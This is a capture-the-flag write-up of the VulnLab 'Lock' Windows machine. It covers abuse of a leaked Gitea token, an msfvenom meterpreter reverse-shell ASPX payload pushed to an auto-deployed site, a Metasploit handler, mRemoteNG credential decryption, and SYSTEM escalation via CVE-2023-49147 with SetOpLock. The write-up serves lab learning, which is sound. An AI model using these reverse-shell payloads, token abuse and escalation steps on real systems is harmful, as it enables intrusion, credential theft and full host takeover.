---
title: Lock
date: 2026-02-12T00:00:00
draft: false
sources: "VulnLab"
difficulties: Easy
tags: ["Windows", "Git", "ASPX", "mRemoteNG", "CVE-2023-49147"]
author: Anx
description: A Windows-based challenge where an exposed Gitea access token leads to source code tampering and remote code execution, followed by credential extraction from mRemoteNG and a final privilege escalation to SYSTEM through the PDF24 Creator vulnerability CVE‑2023‑49147.
---

![alt text](featured.png)

## Nmap
First, as always, the challenge was started by running Nmap to enumerate the server's ports and services.

```
$ sudo nmap -p- -sCV 10.10.66.156 -oA nmap/fulltcp-Lock

Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 15:52 CET
Nmap scan report for 10.10.66.156
Host is up (0.045s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Lock - Index
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=4a1410f7f5912b94; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=HXlkPoIVJzHRd1RcAMJcQnNDQ1g6MTc3MDgyMTc2NjAxNzQ5NzMwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 11 Feb 2026 14:56:06 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=f54a9de08878967e; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=_Grkx2km5IA23N5Hnv7hGe6j55M6MTc3MDgyMTc2NzAxMTA3MDUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 11 Feb 2026 14:56:07 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-11T14:57:09+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2026-02-10T14:32:46
|_Not valid after:  2026-08-12T14:32:46
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-11T14:56:28+00:00
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-02-11T14:56:33
|_  start_date: N/A 
```

## Foothold

An instance of Gitea was identified on port 3000. Within this instance, a repository named `dev-scripts`, owned by the user `ellen.freeman`, was discovered.

![](Pasted%20image%2020260212184541.png)

The repository was cloned for further analysis.

```
git clone http://10.10.66.156:3000/ellen.freeman/dev-scripts.git
```

![](Pasted%20image%2020260212184840.png)

From within the repository directory, `git log` was executed to review the commit history.
![](Pasted%20image%2020260212184857.png)

```
git log
```

![](Pasted%20image%2020260212184958.png)

The repository contained only two commits: the initial commit, which did not contain any useful information, and a second commit that was examined using the following command:

```
git show dcc869b175a47ff2a2b8171cda55cb82dbddff3d
```

![](Pasted%20image%2020260212185057.png)

The commit contained an earlier version of the script used to enumerate the repositories of a given user (in this case, `ellen.freeman`). In this older version, an access token was hardcoded within the source code.

To verify the validity of the token, the current script was modified as shown in the following screenshot:

![](Pasted%20image%2020260212190132.png)

The modified script was saved and subsequently executed.

```
python3 repos.py http://10.10.66.156:3000/
```

![](Pasted%20image%2020260212190150.png)

The token was confirmed to be valid, and execution of the script revealed the existence of a private repository named website. Consequently, the repository was cloned for further analysis.

```bash
git clone http://43ce39bb0[.snip.]67a6362f@10.10.66.156:3000/ellen.freeman/website.git
```

![](Pasted%20image%2020260212191738.png)

The `README` file revealed that changes made to the repository were automatically deployed to the organization’s main website.

```
cat readme.md
```

![](Pasted%20image%2020260212191037.png)

As the web server was running on a Windows host, an ASPX payload was generated using msfvenom.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.8.46 LPORT=5555 -f aspx -o reverse.aspx
```

![](Pasted%20image%2020260212193259.png)

Once the payload was generated, the local repository was configured using the obtained access token, and the updated version was pushed to the remote repository.

```bash
git remote set-url origin http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.10.66.156:3000/ellen.freeman/website.git
```

![](Pasted%20image%2020260212192013.png)

```bash
git add .
git commit -m "1337 update"
git push origin main
```

![](Pasted%20image%2020260212193512.png)

As a result, the payload became accessible through the website and could be executed to obtain a reverse shell. Prior to triggering the payload, a listener was configured in Metasploit to receive the incoming connection.

```bash
use exploit/multi/handler
set LHOST tun0
set LPORT 5555
set payload windows/x64/meterpreter/reverse_tcp
run
```

![](Pasted%20image%2020260212193822.png)

Once the listener was running, the payload was accessed via `http://10.10.66.156/anx.aspx`, resulting in a Meterpreter session being established on the listener executing as `ellen.freeman`.

![](Pasted%20image%2020260212193947.png)

```
shell
whoami
```

![](Pasted%20image%2020260212194104.png)

## Privilege Escalation

### Ellen.freeman to Gale.Dekarios

The following command was executed to identify potentially interesting files within accessible user directories.

```powershell
powershell -c "Get-ChildItem -Path "C:\Users\*" -Recurse -Include *.zip, *.txt, *.log, *.ps1, *.bat, *.kdbx, *.xml -Exclude "AppData", "Microsoft", "OneDrive", "Contacts", "Desktop" -ErrorAction SilentlyContinue"
```

![](Pasted%20image%2020260212200706.png)

A configuration file associated with **mRemoteNG** was identified, containing credentials for the user `Gale.Dekarios`.

```
cat config.xml
```

![](Pasted%20image%2020260212201050.png)

A publicly available script exists on GitHub that can decrypt credentials stored in mRemoteNG configuration files:

[https://github.com/gquere/mRemoteNG_password_decrypt](https://github.com/gquere/mRemoteNG_password_decrypt)

The configuration file was downloaded from the compromised host using Meterpreter, and the decryption script was then cloned and executed locally to recover the stored credentials:

```bash
meterpreter > download config.xml

git clone https://github.com/gquere/mRemoteNG_password_decrypt.git
./mremoteng_decrypt.py ../config.xml
```

![](Pasted%20image%2020260212201344.png)

Finally, the recovered credentials were configured in Remmina to establish an RDP connection to the server.

![](Pasted%20image%2020260212201519.png)

![](Pasted%20image%2020260212201607.png)

### Gale.Dekarios to System (CVE-2023-49147)

Immediately after accessing the system with the `Gale.Dekarios` account, a PDF24 launcher was observed on the Desktop. A quick Google search revealed that the software is affected by a local privilege escalation vulnerability.

Reference:  
- https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/

The installed version of PDF24 was first verified to confirm that it was affected by the documented vulnerability.

![](Pasted%20image%2020260212202016.png)

Then, as explained on the referenced blog, is mandatory to locate the MSI file

![](Pasted%20image%2020260212221718.png)

As described in the referenced advisory, it was necessary to locate the associated MSI installer. Once identified, two PowerShell consoles were opened within the corresponding directory to proceed with the exploitation steps.

Then, the `Release.7z` archive containing the compiled executables was downloaded from the official repository:
- https://github.com/googleprojectzero/symboliclink-testing-tools/releases

From this archive, `SetOpLock.exe` was extracted and uploaded to the target system:

```bash
#Kali
python3 -m http.server 80

#Victim
wget 10.8.8.46/SetOpLock.exe -O SetOpLock.exe
```

![](Pasted%20image%2020260212203324.png)

Once all prerequisites were in place, the following SetOpLock.exe command was executed from one of the PowerShell consoles:

```
./SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

![](Pasted%20image%2020260212204131.png)

This command placed an opportunistic lock (oplock) on the target log file to interfere with the installer’s file operations.

Next, the following command was executed to initiate the repair process of PDF24 Creator and trigger the vulnerable MSI installer behavior:

```
msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
```

![](Pasted%20image%2020260212203818.png)

After successful exploitation, a `cmd.exe` instance was opened under elevated privileges. From this window, the **Properties** menu was accessed by right-clicking on the title bar.\

![](Pasted%20image%2020260212204356.png)

Under the **Options** tab, the **“Legacy Console Mode”** link was selected.

![](Pasted%20image%2020260212204515.png)

Since Internet Explorer and Microsoft Edge do not spawn as SYSTEM on Windows 11, an alternative browser was used, Firefox in this case.

![](Pasted%20image%2020260212204554.png)

This action opened a Microsoft help page in a browser running in the context of the elevated process.

Within the newly opened browser window, the CTRL + O shortcut was pressed to invoke the file open dialog. The path cmd.exe was entered in the address bar and executed, resulting in a new command prompt running with SYSTEM privileges.

![](Pasted%20image%2020260212204633.png)

This process effectively provided an interactive SYSTEM shell:

![](Pasted%20image%2020260212204648.png)